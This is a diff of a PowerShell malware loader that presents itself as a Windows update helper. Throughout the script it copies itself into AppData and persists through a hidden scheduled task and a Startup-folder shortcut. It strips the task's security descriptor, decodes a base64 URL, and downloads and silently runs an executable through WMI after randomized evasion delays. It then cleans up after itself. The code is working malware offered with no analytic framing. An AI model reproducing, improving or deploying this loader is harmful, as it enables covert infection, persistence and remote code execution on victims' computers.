@@ -1,82 +1,70 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === HIDDEN RELAUNCH (kills visible console on startup) ===
-if ($Host.Name -eq 'ConsoleHost') {
-    $null = Start-Job -ScriptBlock {
-        param($path)
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$path`"" -WindowStyle Hidden
-    } -ArgumentList $MyInvocation.MyCommand.Path
-    exit
-}
-
-# === SELF-PRESERVATION ===
+# === SELF-PRESERVATION: Ensure script is saved to disk ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
 function Save-ScriptToDisk {
     param([string]$Destination)
     $dir = Split-Path $Destination -Parent
-    if (-not (Test-Path $dir)) {
-        New-Item -ItemType Directory -Path $dir -Force | Out-Null
-    }
+    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
     if (-not $currentPath -or $currentPath -eq '') {
         try {
             $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
             (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
-        } catch { exit }
+        } catch {
+            exit
+        }
     } else {
         Copy-Item -Path $currentPath -Destination $Destination -Force
     }
     return $Destination
 }
-
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Scheduled Task (improved hidden) ===
+# === PERSISTENCE: Scheduled Task (primary) ===
 $taskName = "WindowsUpdateTask"
-if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
+$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+if (-not $taskExists) {
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
     try {
-        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
-            "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
-        ))
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1) -Priority 7
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        
         $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
-        if (Test-Path $taskPath) {
-            Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction SilentlyContinue
-        }
+        if (Test-Path $taskPath) { Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop }
     } catch {}
 }
 
-# === PERSISTENCE: Startup LNK (max hidden) ===
+# === PERSISTENCE: Startup Folder LNK (backup) ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
-    try {
-        $wshShell = New-Object -ComObject WScript.Shell
-        $shortcut = $wshShell.CreateShortcut($lnkPath)
-        $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
-        $shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Caches"
-        $shortcut.WindowStyle = 7
-        $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"
-        $shortcut.Save()
-    } catch {}
+    $wshShell = New-Object -ComObject WScript.Shell
+    $shortcut = $wshShell.CreateShortcut($lnkPath)
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $shortcut.WindowStyle = 7
+    $shortcut.Save()
 }
 
-# === BEARFOOT EVASION: Delay ===
-Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
+# === MAIN PAYLOAD: Download and execute with evasion ===
+Start-Sleep -Seconds (Get-Random -Min 2 -Max 8)
+Start-Sleep -Seconds (Get-Random -Min 20 -Max 30)
 
-# === DOWNLOAD AND EXECUTE PAYLOAD (original working block) ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
+
+# Base64-encoded URL (EXE)
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9XaW5kb3dzVXBkYXRlSGVscGVyLmV4ZQ=='))
 $exePath = "$cache\WindowsUpdateHelper.exe"
+
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
+Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
+
+# Download EXE (only if missing, with retry)
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
     $maxRetries = 3
@@ -91,9 +79,17 @@ if (-not (Test-Path $exePath)) {
     } while ($retryCount -lt $maxRetries)
 }
 
+
+# Long delay before launching EXE
+Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
+
+# Launch EXE using WMI process creation
 if (Test-Path $exePath) {
     try {
-        $wmiParams = @{ ComputerName = $env:COMPUTERNAME; CommandLine = "`"$exePath`"" }
+        $wmiParams = @{
+            ComputerName = $env:COMPUTERNAME
+            CommandLine  = "`"$exePath`""
+        }
         Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
     } catch {
         try {
@@ -105,7 +101,7 @@ if (Test-Path $exePath) {
     }
 }
 
-# Self-delete
+# Cleanup after 5 minutes
 Start-Job -ScriptBlock {
     param($exe)
     Start-Sleep -Seconds 300
